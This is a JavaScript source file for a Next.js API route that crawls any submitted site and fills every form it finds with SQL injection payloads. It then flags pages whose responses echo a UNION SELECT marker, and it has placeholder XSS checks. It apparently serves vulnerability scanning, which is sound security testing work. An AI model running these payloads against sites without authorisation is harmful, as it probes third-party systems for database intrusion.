import axios from 'axios';
import * as cheerio from 'cheerio';
import Crawler from 'crawler';
import { NextResponse } from 'next/server';
import { URL } from 'url';

// Set to keep track of visited URLs
const visitedUrls = new Set();

// SQL injection payloads, including one to inject the unique string
const sqlInjectionPayloads = [
  "' OR '1'='1' -- ",
  "' UNION SELECT '57ddbd5f-a702-4b94-8c1f-0741741a34fb_TESTING', NULL -- ",
];

// Function to detect SQL injection responses with the unique string
function detectTestingStringResponses($) {
  console.info('Detecting testing string responses...');
  const responses = [];
  const html = $.html();

  const targetString = '57ddbd5f-a702-4b94-8c1f-0741741a34fb_TESTING';
  const fullPayloadRegex = /'\s*UNION\s*SELECT.*57ddbd5f-a702-4b94-8c1f-0741741a34fb_TESTING.*--/i;

  const targetOccurrences = html.match(new RegExp(targetString, 'g')) || [];
  const fullPayloadOccurrences = html.match(fullPayloadRegex) || [];

  if (targetOccurrences.length > 0 && targetOccurrences.length > fullPayloadOccurrences.length) {
    responses.push(targetString);
  }

  return responses.length ? { type: 'testing_string_response', data: responses } : null;
}

// Function to detect SQL injection-like response patterns in <pre> tags
function detectSQLInjectionResponses($) {
  console.info('Detecting SQL injection responses...');
  const sqlInjectionPatterns = [];
  $('pre').each((i, pre) => {
    const text = $(pre).text().trim();
    if (/ID:\s*'[^']*--/.test(text)) {
      sqlInjectionPatterns.push(text);
    }
  });

  return sqlInjectionPatterns.length
    ? { type: 'sql_injection_response', data: sqlInjectionPatterns }
    : null;
}

// Function to find patterns in the HTML response
function findPatterns(html) {
  console.info('Finding patterns in HTML response...');
  const $ = cheerio.load(html);
  const patterns = [];
  const patternDetectors = [
    () => detectSQLInjectionResponses($),
    () => detectTestingStringResponses($),
  ];

  for (const detector of patternDetectors) {
    const result = detector();
    if (result) {
      patterns.push(result);
    }
  }

  return patterns;
}

// Function to fetch and submit all forms on a given URL
async function fetchAndPostForms(pageUrl) {
  console.info(`Fetching and posting forms on ${pageUrl}`);
  const sqlHitUrls = [];
  try {
    const response = await axios.get(pageUrl);
    const body = response.data;
    const $ = cheerio.load(body);

    const forms = $('form');
    for (let i = 0; i < forms.length; i++) {
      console.info(`Processing form ${i + 1} of ${forms.length} on ${pageUrl}`);
      const form = forms[i];
      const formAction = $(form).attr('action') || pageUrl;
      const formMethod = $(form).attr('method') || 'GET';
      const inputs = $(form).find('input, select, textarea');

      const formData = {};
      inputs.each((index, input) => {
        const name = $(input).attr('name');
        const value = $(input).attr('value') || '';
        if (name) formData[name] = value;
      });

      let actionUrl = new URL(formAction, pageUrl).href;
      if (actionUrl.endsWith('#')) {
        actionUrl = actionUrl.slice(0, -1);
        console.info('actionUrl 3', actionUrl);
      }
      if (formMethod.toUpperCase() === 'POST') {
        for (const payload of sqlInjectionPayloads) {
          const inputKeys = Object.keys(formData);
          if (inputKeys.length > 0) {
            formData[inputKeys[0]] = payload;
          }

          try {
            console.info(`Submitting POST form to ${actionUrl} with payload: ${payload}`);
            const formResponse = await axios.post(actionUrl, new URLSearchParams(formData), {
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
              },
            });

            const patterns = findPatterns(formResponse.data);
            if (patterns.length > 0) {
              console.info(`SQL injection patterns found on ${pageUrl}`);
              sqlHitUrls.push(pageUrl);
            }
          } catch (error) {
            console.error(`Error submitting POST form: ${error.message}`);
          }
        }
      } else if (formMethod.toUpperCase() === 'GET') {
        for (const payload of sqlInjectionPayloads) {
          const queryParams = new URLSearchParams(formData);
          const inputKeys = Array.from(queryParams.keys());
          if (inputKeys.length > 0) {
            queryParams.set(inputKeys[0], payload);
          }

          try {
            console.info(`Submitting GET form to ${actionUrl} with payload: ${payload}`);
            const formResponse = await axios.get(actionUrl + '?' + queryParams.toString());

            const patterns = findPatterns(formResponse.data);
            if (patterns.length > 0) {
              console.info(`SQL injection patterns found on ${pageUrl}`);
              sqlHitUrls.push(pageUrl);
            }
          } catch (error) {
            console.error(`Error submitting GET form: ${error.message}`);
          }
        }
      }
    }
  } catch (error) {
    console.error(`Error fetching page ${pageUrl}: ${error.message}`);
  }
  return sqlHitUrls;
}

// Function to process and extract links from the page
function extractLinks($, mainDomain, baseUrl) {
  console.info(`Extracting links from ${baseUrl}`);
  const links = new Set();
  $('a').each((index, element) => {
    const href = $(element).attr('href');
    if (href) {
      try {
        const fullUrl = new URL(href, baseUrl).href;
        const urlObj = new URL(fullUrl);
        if (/\.(jpg|jpeg|png|gif|bmp|svg|webp|yml|yaml)$/i.test(urlObj.pathname)) return;
        if (urlObj.hostname === mainDomain) {
          links.add(fullUrl);
        }
      } catch (err) {
        console.error(`Error creating URL from href: ${href} with base: ${baseUrl}`, err.message);
      }
    }
  });
  return links;
}

// Function to start the crawler
async function startCrawler(startUrl) {
  console.info(`Starting crawler at ${startUrl}`);
  const mainDomain = new URL(startUrl).hostname;
  const sqlHitUrls = [];

  const crawler = new Crawler({
    maxConnections: 10,
    retries: 3,
    callback: async (error, res, done) => {
      if (error) {
        console.error(`Error crawling ${res.options?.uri || 'unknown URL'}:`, error.message);
      } else {
        const $ = res.$;
        const pageUrl = res.options.url;
        if ($ && pageUrl) {
          console.info(`Crawling page: ${pageUrl}`);
          visitedUrls.add(pageUrl);
          const pageSqlHits = await fetchAndPostForms(pageUrl);
          sqlHitUrls.push(...pageSqlHits);

          const links = extractLinks($, mainDomain, pageUrl);
          links.forEach((link) => {
            if (!visitedUrls.has(link)) {
              visitedUrls.add(link);
              crawler.queue(link);
            }
          });
        }
      }
      done();
    },
  });

  return new Promise((resolve) => {
    crawler.queue(startUrl);
    crawler.on('drain', () => {
      console.info('Crawler finished', sqlHitUrls.length, 'SQL injection hits found.', sqlHitUrls);
      resolve(sqlHitUrls);
    });
  });
}

// Placeholder function for XSS testing
async function performXSSAttempt(url) {
  console.info(`Performing XSS attempt on ${url}`);
  // Placeholder logic for XSS testing
  return { url, result: 'XSS attempt placeholder' };
}

// Placeholder function for another security check
async function performAdditionalCheck(url) {
  console.info(`Performing additional check on ${url}`);
  // Placeholder logic for another security test
  return { url, result: 'Additional check placeholder' };
}

// API route handler
export async function POST(req) {
  const { startUrl } = await req.json();
  if (!startUrl) {
    console.error('startUrl is required but missing.');
    return NextResponse.json({ error: 'startUrl is required' }, { status: 400 });
  }

  console.info(`Received API request with startUrl: ${startUrl}`);

  try {
    const crawlerResults = await startCrawler(startUrl);
    const xssResults = await performXSSAttempt(startUrl);
    const additionalCheckResults = await performAdditionalCheck(startUrl);

    console.info('API request processing complete.');
    return NextResponse.json({
      crawlerResults,
      xssResults,
      additionalCheckResults,
    });
  } catch (error) {
    console.error('Internal Server Error:', error);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}
